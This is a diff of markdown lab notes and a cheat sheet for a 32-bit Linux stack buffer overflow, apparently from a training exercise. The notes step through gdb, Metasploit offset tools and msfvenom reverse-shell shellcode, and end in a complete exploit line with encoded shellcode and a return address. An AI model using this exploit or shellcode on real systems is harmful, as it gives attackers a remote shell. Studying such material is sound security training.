@@ -760,17 +760,11 @@ x/2000xb $esp+750
 
 ![image](https://user-images.githubusercontent.com/83395536/234828845-918fe49a-642c-4c30-bfd8-2461e97bd731.png)
 
- 
-
 End memory adress is `0xffffd68a`
-
-
 
 Convert it to little endian
 
 `0xffffd68a` -> `\x8A\xD6\xFF\xFF`
-
-
 
 Now our final payload will be
 
@@ -778,13 +772,7 @@ Now our final payload will be
 ./leave_msg $(python -c 'print "\x55" * (2060 - 124 - 95 - 4) + "\x90" * 124 + "\xd9\xeb\xd9\x74\x24\xf4\x5d\x29\xc9\xb8\xfc\x4b\xe3\x50\xb1\x12\x31\x45\x17\x03\x45\x17\x83\x39\x4f\x01\xa5\xf0\x8b\x32\xa5\xa1\x68\xee\x40\x47\xe6\xf1\x25\x21\x35\x71\xd6\xf4\x75\x4d\x14\x86\x3f\xcb\x5f\xee\xc0\x2b\xa0\xef\x56\x2e\xa0\xfe\xfa\xa7\x41\xb0\x65\xe8\xd0\xe3\xda\x0b\x5a\xe2\xd0\x8c\x0e\x8c\x84\xa3\xdd\x24\x31\x93\x0e\xd6\xa8\x62\xb3\x44\x78\xfc\xd5\xd8\x75\x33\x95" + "\x8A\xD6\xFF\xFF"')
 ```
 
-
-
 We run the program outside `gdb` 
-
-
-
-
 
 gdb -q leave_msg
 
@@ -792,22 +780,336 @@ gdb -q leave_msg
 
 # Cheat sheet
 
+## Check filetype
 
-1. check filetype
-this could be objdump or just normal file check
+Objdump
 
-2. Testing buffer with MSFvenom to find the `EIP`
-- Make the buffer file
-- Running the made buffer
+```shell
+objdump -f leave_msg 
+```
 
-3. running gdb -q
-4. Disassemble main
-5. Adding breakpoints
-7. Checking the return adress for the end of the exploit
-8. Checking bad characters
-9. Making exploit without the bad characters
-10. Running maybe a clean version of the exploit to find the return adress
-11. Using everything together with python
+File
+
+```shell
+file leave_msg
+```
+
+or
+
+```shell
+file leave_msg | tr "," "\n"
+```
+
+## Open the file
+
+```shell
+gdb -q leave_msg
+```
+
+## Set syntax to Intel
+
+```shell
+(gdb) set disassembly-flavor intel
+```
+
+## Dissasemble file
+
+```shell
+(gdb) disassemble main
+```
+
+## Determine offset with `MSFvenom`
+
+```shell
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1200 > pattern.txt
+```
+
+then `cat` the output
+
+```shell
+cat pattern.txt
+```
+
+## Run file
+
+```shell
+(gdb) run $(python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5...<SNIP>...Bn6Bn7Bn8Bn9'") 
+```
+
+## Check EIP memory adress
+
+```shell
+(gdb) info registers eip
+
+eip            0x69423569    0x69423569
+```
+
+EIP displays different memory adress
+
+Use this adress to find the offset
+
+## Find `gdb` offset with `MSFvenom`
+
+Use the offset that you found
+
+```shell-session
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x69423569
+
+[*] Exact match at offset 1036
+```
+
+The offset is 1036 in this case
+
+## Determine that you have found the offset
+
+```shell
+(gdb) run $(python -c "print '\x55' * 1036 + '\x66' * 4")
+```
+
+## Determine length of shellcode
+
+```shell
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 lport=31337 --platform linux --arch x86 --format c
+
+
+No encoder or badchars specified, outputting raw payload
+Payload size: 68 bytes
+<SNIP>
+```
+
+68 bytes
+
+### Shellcode calculation with `NOPs`
+
+```shell
+   Buffer = "\x55" * (1040 - 100 - 150 - 4) = 786
+     NOPs = "\x90" * 100
+Shellcode = "\x44" * 150
+      EIP = "\x66" * 4'
+```
+
+### In `gdb`
+
+```shell
+(gdb) run $(python -c 'print "\x55" * (1040 - 100 - 150 - 4) + "\x90" * 100 + "\x44" * 150 + "\x66" * 4')(gdb) run $(python -c 'print "\x55" * (1040 - 100 - 150 - 4) + "\x90" * 100 + "\x44" * 150 + "\x66" * 4')
+```
+
+## Check bad characters
+
+### Characters
+
+```shell
+CHARS="\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
+```
+
+### Notes
+
+```shell
+Buffer = "\x55" * (1040 - 256 - 4) = 780
+ CHARS = "\x00\x01\x02\x03\x04\x05...<SNIP>...\xfd\xfe\xff"
+   EIP = "\x66" * 4
+```
+
+### Find where we need to break a function
+
+```shell
+(gdb) disas main
+```
+
+output
+
+```shell
+(gdb) disas main
+Dump of assembler code for function main:
+   0x56555582 <+0>:     lea    ecx,[esp+0x4]
+   0x56555586 <+4>:     and    esp,0xfffffff0
+   0x56555589 <+7>:     push   DWORD PTR [ecx-0x4]
+   0x5655558c <+10>:    push   ebp
+   0x5655558d <+11>:    mov    ebp,esp
+   0x5655558f <+13>:    push   ebx
+   0x56555590 <+14>:    push   ecx
+   0x56555591 <+15>:    call   0x56555450 <__x86.get_pc_thunk.bx>
+   0x56555596 <+20>:    add    ebx,0x1a3e
+   0x5655559c <+26>:    mov    eax,ecx
+   0x5655559e <+28>:    mov    eax,DWORD PTR [eax+0x4]
+   0x565555a1 <+31>:    add    eax,0x4
+   0x565555a4 <+34>:    mov    eax,DWORD PTR [eax]
+   0x565555a6 <+36>:    sub    esp,0xc
+   0x565555a9 <+39>:    push   eax
+   0x565555aa <+40>:    call   0x5655554d <bowfunc>        # <---- bowfunc Function
+   0x565555af <+45>:    add    esp,0x10
+   0x565555b2 <+48>:    sub    esp,0xc
+   0x565555b5 <+51>:    lea    eax,[ebx-0x1974]
+   0x565555bb <+57>:    push   eax
+   0x565555bc <+58>:    call   0x565553e0 <puts@plt>
+   0x565555c1 <+63>:    add    esp,0x10
+   0x565555c4 <+66>:    mov    eax,0x1
+   0x565555c9 <+71>:    lea    esp,[ebp-0x8]
+   0x565555cc <+74>:    pop    ecx
+   0x565555cd <+75>:    pop    ebx
+   0x565555ce <+76>:    pop    ebp
+   0x565555cf <+77>:    lea    esp,[ecx-0x4]
+   0x565555d2 <+80>:    ret    
+End of assembler dump.
+```
+
+### Make breakpoint
+
+```shell
+(gdb) break bowfunc
+```
+
+## Send CHARS
+
+```shell
+(gdb) run $(python -c 'print "\x55" * (1040 - 256 - 4) + "\x00\x01\x02\x03\x04\x05...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')
+```
+
+output
+
+```shell
+Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 256 - 4) + "\x00\x01\x02\x03\x04\x05...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')
+/bin/bash: warning: command substitution: ignored null byte in input
+
+Breakpoint 1, 0x56555551 in bowfunc ()
+```
+
+### Checking stack
+
+```shell
+(gdb) x/2000xb $esp+500
+```
+
+And then find where the `x55` ends and check for every null byte `x00`
+
+## Make shellcode
+
+```shell
+msfvenom -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=31337 --format c --arch x86 --platform linux --bad-chars "\x00\x09\x0a\x20" --out shellcode
+```
+
+output
+
+```shell
+Found 11 compatible encoders
+Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 95 (iteration=0)
+x86/shikata_ga_nai chosen with final size 95
+Payload size: 95 bytes
+Final size of c file: 425 bytes
+Saved as: shellcode
+```
+
+### Shellcode
+
+```shell
+cat shellcode
+```
+
+output
+
+```shell
+unsigned char buf[] = 
+"\xda\xca\xba\xe4\x11\xd4\x5d\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
+"\x12\x31\x50\x17\x03\x50\x17\x83\x24\x15\x36\xa8\x95\xcd\x41"
+"\xb0\x86\xb2\xfe\x5d\x2a\xbc\xe0\x12\x4c\x73\x62\xc1\xc9\x3b"
+<SNIP>
+```
+
+### Notes
+
+```shell
+   Buffer = "\x55" * (1040 - 124 - 95 - 4) = 817
+     NOPs = "\x90" * 124
+Shellcode = "\xda\xca\xba\xe4\x11...<SNIP>...\x5a\x22\xa2"
+      EIP = "\x66" * 4'
+```
+
+## Run shellcode
+
+```shell
+(gdb) run $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xda\xca\xba\xe4...<SNIP>...\xad\xec\xa0\x04\x5a\x22\xa2" + "\x66" * 4')
+```
+
+output
+
+```shell
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xda\xca\xba\xe4...<SNIP>...\xad\xec\xa0\x04\x5a\x22\xa2" + "\x66" * 4')
+
+Breakpoint 1, 0x56555551 in bowfunc ()
+```
+
+### Check stack
+
+```shell
+(gdb) x/2000xb $esp+550
+```
+
+output 
+
+```shell
+<SNIP>
+0xffffd64c:    0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xffffd654:    0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90
+0xffffd65c:    0x90    0x90    0xda    0xca    0xba    0xe4    0x11    0xd4
+                         # |----> Shellcode begins
+<SNIP>
+```
+
+## Find return adress
+
+needs breakpoint!!
+
+```shell
+(gdb) run $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xda\xca\xba\xe4...<SNIP>...\xad\xec\xa0\x04\x5a\x22\xa2" + "\x66" * 4')
+```
+
+```shell
+x/2000xb $esp+750
+```
+
+![image](https://user-images.githubusercontent.com/83395536/234828845-918fe49a-642c-4c30-bfd8-2461e97bd731.png)
+
+End memory adress is `0xffffd68a`
+
+### Convert to little endian
+
+[link]([Online Hex Converter - Bytes, Ints, Floats, Significance, Endians - SCADACore](https://www.scadacore.com/tools/programming-calculators/online-hex-converter/))
+
+`0xffffd68a` -> `\x8A\xD6\xFF\xFF`
+
+### Edit return adress
+
+old:
+
+```shell
+(gdb) run $(python -c 'print "\x55" * (1040 - 124 - 95 - 4) + "\x90" * 124 + "\xda\xca\xba\xe4...<SNIP>...\xad\xec\xa0\x04\x5a\x22\xa2" + "\x66" * 4')
+```
+
+new:
+
+```shell
+(gdb) run $(python -c 'print "\x55" * (2060 - 124 - 95 - 4) + "\x90" * 124 + "\xd9\xeb\xd9\x74\x24\xf4\x5d\x29\xc9\xb8\xfc\x4b\xe3\x50\xb1\x12\x31\x45\x17\x03\x45\x17\x83\x39\x4f\x01\xa5\xf0\x8b\x32\xa5\xa1\x68\xee\x40\x47\xe6\xf1\x25\x21\x35\x71\xd6\xf4\x75\x4d\x14\x86\x3f\xcb\x5f\xee\xc0\x2b\xa0\xef\x56\x2e\xa0\xfe\xfa\xa7\x41\xb0\x65\xe8\xd0\xe3\xda\x0b\x5a\xe2\xd0\x8c\x0e\x8c\x84\xa3\xdd\x24\x31\x93\x0e\xd6\xa8\x62\xb3\x44\x78\xfc\xd5\xd8\x75\x33\x95" + "\x8A\xD6\xFF\xFF"')
+```
+
+## Final exploit
+
+```shell
+./leave_msg $(python -c 'print "\x55" * (2060 - 124 - 95 - 4) + "\x90" * 124 + "\xd9\xeb\xd9\x74\x24\xf4\x5d\x29\xc9\xb8\xfc\x4b\xe3\x50\xb1\x12\x31\x45\x17\x03\x45\x17\x83\x39\x4f\x01\xa5\xf0\x8b\x32\xa5\xa1\x68\xee\x40\x47\xe6\xf1\x25\x21\x35\x71\xd6\xf4\x75\x4d\x14\x86\x3f\xcb\x5f\xee\xc0\x2b\xa0\xef\x56\x2e\xa0\xfe\xfa\xa7\x41\xb0\x65\xe8\xd0\xe3\xda\x0b\x5a\xe2\xd0\x8c\x0e\x8c\x84\xa3\xdd\x24\x31\x93\x0e\xd6\xa8\x62\xb3\x44\x78\xfc\xd5\xd8\x75\x33\x95" + "\x8A\xD6\xFF\xFF"')
+```
+
+this is ran outside gdb
+
+
+
+We run the program outside `gdb`
+
+Running maybe a clean version of the exploit to find the return adress
+
+3. Using everything together with python
 
 need also a sheet for subtracting the numbers
 
